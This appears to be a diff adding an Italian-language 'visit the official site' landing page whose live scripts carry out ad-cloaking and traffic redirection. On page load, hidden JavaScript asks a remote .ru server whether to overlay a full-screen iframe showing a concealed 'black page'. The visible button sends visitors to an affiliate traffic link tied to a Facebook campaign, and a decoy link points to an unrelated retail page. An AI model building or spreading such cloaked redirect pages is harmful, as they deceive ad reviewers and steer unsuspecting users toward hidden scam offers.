@@ -1,0 +1,56 @@
+<html lang="it">
+<head>
+    <link rel="shortcut icon" href="http://faviconka.ru/ico/faviconka_ru_1469.ico" type="image/x-icon">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+     <title>Visita il sito ufficiale</title>
+    <link rel="stylesheet" href="main.css">
+</head>
+<body>
+    <script>
+    window.onload = function () {
+        var http = new XMLHttpRequest();
+        var url = 'https://beastsh0p.ru/dit9/ajax.php';
+        var params = '';
+        http.open('POST', url, true);
+        //Send the proper header information along with the request
+        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        http.onreadystatechange = function () {//Call a function when the state changes.
+            if (http.readyState == 4 && http.status == 200) {
+                var obj = JSON.parse(http.responseText);
+                if(obj.type == 'blackpage') {
+                    var ifrm = document.createElement("iframe");
+                    ifrm.setAttribute("src", obj.page);
+                    ifrm.style.width = "100%";
+                    ifrm.style.height = "100%";
+                    ifrm.style.border = "none";
+                    ifrm.style.margin = "none";
+                    ifrm.style.position = "absolute";
+                    ifrm.style.top = "0";
+                    document.body.appendChild(ifrm);
+                }
+            }
+        };
+        http.send(params);
+    }
+</script>
+    <div class="wrapper">
+        <div class="center">
+            <p>Vuoi andare al sito ufficiale?</p>
+            <a class="no" href="https://www.zarahome.com/es/sypialnia/po%C5%9Bciel/poszwy-na-ko%C5%82dr%C4%99-c1020087466.html">no</a>
+            <a class="yes" id="link">Vai al sito Web</a>
+            
+        </div>
+    </div>
+    <a href="https://policies.google.com/privacy?hl=it" class="policy">Informativa sulla privacy</a>
+   
+     <script type="text/javascript">
+        let utm = window.location.href.split('?').pop(); //получаем utm
+        document.getElementById('link').onclick = function() { //по клику на кнопку
+        window.location = 'http://just4traff.com/cosmo-plus/it/lp1/?flow=3069&fb=500422230803293'; //переправляем пользователя на новый адрес
+}
+    </script>
+      
+</body>
+</html>
